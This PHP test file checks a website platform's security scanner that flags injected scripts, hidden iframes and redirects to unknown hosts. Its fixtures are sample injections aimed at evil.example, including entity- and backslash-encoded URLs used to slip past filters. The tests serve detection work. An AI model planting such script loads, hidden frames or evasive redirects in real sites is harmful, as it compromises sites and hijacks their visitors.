<?php
/**
 * Pinegrap - Enterprise Website Platform
 *
 * Tests for the Security Scan's stored-content rules
 * (includes/fn/security_scan_content.php): a script, a hidden frame or a
 * redirect from a host the site does not use, the known hosts and how a host
 * is matched against them, the cursor of the resumable pass and the
 * sightings it gives for one record.
 *
 * @author      Erdal Güral (Kodpen)
 * @link        https://kodpen.com
 * @copyright   2017–2026 Kodpen
 * @license     https://opensource.org/licenses/mit-license.html MIT License
 */

if (!defined('PG_TEST_RUNNER')) {
	exit;
}

function test_security_content_url_host_reads_absolute_and_protocol_relative()
{
	pg_assert_same('evil.example', pg_security_content_url_host('https://Evil.Example/x.js'));
	pg_assert_same('evil.example', pg_security_content_url_host('//evil.example:8080/x.js'));
	pg_assert_same('evil.example', pg_security_content_url_host('http://user:pw@evil.example/'));
	pg_assert_same('evil.example', pg_security_content_url_host(' https://evil.example. '));
	pg_assert_same('evil.example', pg_security_content_url_host('https:\/\/evil.example\/x.js'), 'escaped slashes of a JSON or JS string');
	pg_assert_same('', pg_security_content_url_host('/js/site.js'), 'the site itself');
	pg_assert_same('', pg_security_content_url_host('js/site.js'));
	pg_assert_same('', pg_security_content_url_host('data:text/javascript,alert(1)'));
	pg_assert_same('', pg_security_content_url_host('{path}x.js'));
	pg_assert_same('', pg_security_content_url_host(array()));
}

function test_security_content_host_known_covers_subdomains_only()
{
	$known = array('google.com', 'cdn.jsdelivr.net', 'example.org');

	pg_assert_true(pg_security_content_host_known('google.com', $known));
	pg_assert_true(pg_security_content_host_known('www.google.com', $known));
	pg_assert_true(pg_security_content_host_known('a.b.example.org', $known));
	pg_assert_false(pg_security_content_host_known('evilgoogle.com', $known), 'a longer name is another host');
	pg_assert_false(pg_security_content_host_known('google.com.evil.example', $known));
	pg_assert_false(pg_security_content_host_known('jsdelivr.net', $known), 'a parent is not covered by a child');
	pg_assert_false(pg_security_content_host_known('', $known));
}

function test_security_content_known_hosts_join_site_csp_and_builtin()
{
	$hosts = pg_security_content_known_hosts('www.mysite.example', "default-src 'self'; script-src 'self' https://cdn.partner.example *.widgets.example 'unsafe-inline'; report-uri /x.php");

	pg_assert_true(in_array('mysite.example', $hosts, true), 'the site without www');
	pg_assert_true(in_array('www.mysite.example', $hosts, true));
	pg_assert_true(in_array('cdn.partner.example', $hosts, true), 'a host of the policy');
	pg_assert_true(in_array('widgets.example', $hosts, true), 'a wildcard source');
	pg_assert_true(in_array('googletagmanager.com', $hosts, true), 'built in');
	pg_assert_false(in_array('self', $hosts, true));
	pg_assert_false(in_array('unsafe-inline', $hosts, true));
	pg_assert_same(count($hosts), count(array_unique($hosts)));
}

function test_security_content_rules_find_a_script_from_an_unknown_host()
{
	$known = array('mysite.example', 'googletagmanager.com');
	$html = '<p>Hi</p><script async src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>'
		. '<SCRIPT type="text/javascript" src=\'//evil.example/a.js\'></SCRIPT><script src="/js/own.js"></script>';
	$found = pg_security_content_rules($html, $known);

	pg_assert_same(array('content_script_host' => array('evil.example')), $found);
}

function test_security_content_rules_read_entities_in_an_attribute_value()
{
	$known = array('mysite.example');

	// The browser decodes character references inside an attribute value.
	foreach (array(
		'<script src="https&#58;//evil.example/a.js"></script>',
		'<script src="&#x2F;&#x2F;evil.example/a.js"></script>',
		'<script src="https:&sol;&sol;evil.example/a.js"></script>',
	) as $html) {
		pg_assert_same(array('content_script_host' => array('evil.example')), pg_security_content_rules($html, $known), $html);
	}

	pg_assert_same(array('content_redirect' => array('evil.example')), pg_security_content_rules('<meta http-equiv="refresh" content="0;url=https&#x3A;&#x2F;&#x2F;evil.example/">', $known));
	pg_assert_same(array(), pg_security_content_rules('&lt;script src="//evil.example/a.js"&gt;&lt;/script&gt;', $known), 'an escaped tag is text');
	pg_assert_same(array(), pg_security_content_rules('<iframe src="https://www.youtube.com/embed/x?a=1&amp;b=2" width="560"></iframe>', array('youtube.com')));
}


function test_security_content_rules_read_backslashes_as_slashes()
{
	$known = array('mysite.example');

	// For http and https a browser reads a backslash as a slash.
	pg_assert_same(array('content_script_host' => array('evil.example')), pg_security_content_rules('<script src="https:\\\\evil.example/a.js"></script>', $known));
	pg_assert_same(array('content_script_host' => array('evil.example')), pg_security_content_rules('<script src="\\\\evil.example/a.js"></script>', $known));
	pg_assert_same(array('content_script_host' => array('evil.example')), pg_security_content_rules('<script src="/\\evil.example/a.js"></script>', $known));
	pg_assert_same('evil.example', pg_security_content_url_host('https:\\\\evil.example\\a.js'));
	pg_assert_same('', pg_security_content_url_host('\\js\\own.js'), 'a path on the site');
	pg_assert_same('', pg_security_content_url_host('\/cdn.mysite.example\/a.js'), 'a JSON-escaped path on the site');
	pg_assert_same('evil.example', pg_security_content_url_host('https:\/\/evil.example\/a.js'));
}


function test_security_content_rules_find_a_script_added_by_code()
{
	$known = array('mysite.example');
	$js = "var s=document.createElement('script'); s.src = 'https://evil.example/p.js?v=2'; document.head.appendChild(s);";

	pg_assert_same(array('content_script_host' => array('evil.example')), pg_security_content_rules($js, $known));
	pg_assert_same(array(), pg_security_content_rules("img.src = 'https://pics.example/a.png';", $known), 'a picture is not a script');
}

function test_security_content_rules_find_only_hidden_frames()
{
	$known = array('youtube.com');
	$visible = '<iframe src="https://maps.example/embed" width="600" height="400"></iframe>';
	$known_hidden = '<iframe src="https://www.youtube.com/embed/x" style="display:none"></iframe>';

	pg_assert_same(array(), pg_security_content_rules($visible . $known_hidden, $known));

	$shown = array(
		'<iframe src="https://maps.example/e" style="overflow: hidden; opacity: 1" width="100%" height="450"></iframe>',
		'<iframe src="https://maps.example/e" style="border-width:0; max-height:1px; opacity:0.5"></iframe>',
		'<iframe src="https://maps.example/e" width="10" height="100" title="hidden map"></iframe>',
	);

	foreach ($shown as $case) {
		pg_assert_same(array(), pg_security_content_rules($case, $known), $case);
	}

	$cases = array(
		'<iframe src="https://evil.example/x" width="0" height="0"></iframe>',
		'<iframe width=1 height=1 src=https://evil.example/x></iframe>',
		'<iframe src="https://evil.example/x" style="visibility: hidden"></iframe>',
		'<iframe src="https://evil.example/x" style="position:absolute;left:-9999px"></iframe>',
		'<iframe hidden src="https://evil.example/x"></iframe>',
		'<iframe src="https://evil.example/x" style="opacity:0"></iframe>',
		'<iframe src="https://evil.example/x" style="width:0;height:0;border:0"></iframe>',
	);

	foreach ($cases as $case) {
		pg_assert_same(array('content_iframe_hidden' => array('evil.example')), pg_security_content_rules($case, $known), $case);
	}
}

function test_security_content_rules_find_a_redirect_away()
{
	$known = array('mysite.example');
	$cases = array(
		'<meta http-equiv="refresh" content="0; url=https://evil.example/">',
		"<meta content='3;URL=//evil.example/x' http-equiv='Refresh'>",
		'<script>window.location.href = "https://evil.example/";</script>',
		"<script>if(!document.cookie){top.location.replace('https://evil.example/?r=1')}</script>",
		'<script>document.location="https://evil.example"</script>',
		"<script>location.assign('https://evil.example/');</script>",
	);

	foreach ($cases as $case) {
		pg_assert_same(array('content_redirect' => array('evil.example')), pg_security_content_rules($case, $known), $case);
	}

	pg_assert_same(array(), pg_security_content_rules('<script>location.href = "https://www.mysite.example/tr/";</script>', $known), 'the site itself');
	pg_assert_same(array(), pg_security_content_rules('<a href="https://other.example/">link</a>', $known), 'a link is a person\'s click');
}

function test_security_content_rules_list_each_host_once_sorted()
{
	$html = '<script src="https://b.example/x.js"></script><script src="https://a.example/y.js"></script><script src="https://b.example/z.js"></script>';

	pg_assert_same(array('content_script_host' => array('a.example', 'b.example')), pg_security_content_rules($html, array()));
	pg_assert_same(array(), pg_security_content_rules('', array()));
	pg_assert_same(array(), pg_security_content_rules(null, array()));
}

function test_security_content_sightings_of_one_record()
{
	$known = array('mysite.example');
	$fields = array(
		'pregion_content' => '<script src="https://evil.example/a.js"></script>',
		'other' => '<meta http-equiv="refresh" content="0;url=https://away.example/">',
	);
	$sightings = pg_security_content_sightings('pregion', 12, $fields, $known);

	pg_assert_same(2, count($sightings));
	pg_assert_same('content_script_host', $sightings[0]['kind']);
	pg_assert_same('pregion:12', $sightings[0]['place']);
	pg_assert_same(PG_SECURITY_SEVERITY_HIGH, $sightings[0]['severity']);
	pg_assert_same('evil.example (pregion_content)', $sightings[0]['detail']);
	pg_assert_same('content_redirect', $sightings[1]['kind']);
	pg_assert_same(PG_SECURITY_SEVERITY_CRITICAL, $sightings[1]['severity']);
	pg_assert_same(pg_security_fingerprint('content_redirect', 'pregion:12'), $sightings[1]['fingerprint']);
	pg_assert_same(array(), pg_security_content_sightings('pregion', 0, $fields, $known), 'no record without an id');
}

function test_security_content_sightings_join_hosts_of_several_fields()
{
	$fields = array(
		'style_head' => '<script src="https://b.example/x.js"></script>',
		'style_code' => '<script src="https://a.example/x.js"></script><script src="https://b.example/y.js"></script>',
	);
	$sightings = pg_security_content_sightings('style', 3, $fields, array());

	pg_assert_same(1, count($sightings));
	pg_assert_same('a.example (style_code), b.example (style_head, style_code)', $sightings[0]['detail']);
}

function test_security_content_cursor_walks_the_sources_in_order()
{
	$sources = pg_security_content_source_names();

	pg_assert_same('page', $sources[0]);
	pg_assert_true(in_array('pregion', $sources, true));
	pg_assert_true(in_array('cregion', $sources, true));
	pg_assert_true(in_array('style', $sources, true));
	pg_assert_same('config', $sources[count($sources) - 1]);

	$cursor = pg_security_content_cursor(null, 100);
	pg_assert_same(array('source' => 0, 'after' => 0, 'started' => 100, 'unread' => array()), $cursor);

	$kept = pg_security_content_cursor(array('source' => 2, 'after' => 55, 'started' => 90), 100);
	pg_assert_same(array('source' => 2, 'after' => 55, 'started' => 90, 'unread' => array()), $kept, 'a pass in progress keeps its place');

	// A source that could not be read stays named until the pass closes, so
	// its findings are not marked gone; a name that is no source is dropped.
	$kept = pg_security_content_cursor(array('source' => 3, 'after' => 0, 'started' => 90, 'unread' => array('page', 'nope', 7)), 100);
	pg_assert_same(array('page'), $kept['unread']);

	pg_assert_same(array('source' => 0, 'after' => 0, 'started' => 100, 'unread' => array()), pg_security_content_cursor(array('source' => 99, 'after' => 1, 'started' => 5), 100), 'a broken cursor starts again');
	pg_assert_same(array('source' => 0, 'after' => 0, 'started' => 100, 'unread' => array()), pg_security_content_cursor(array('source' => 'x'), 100));
}
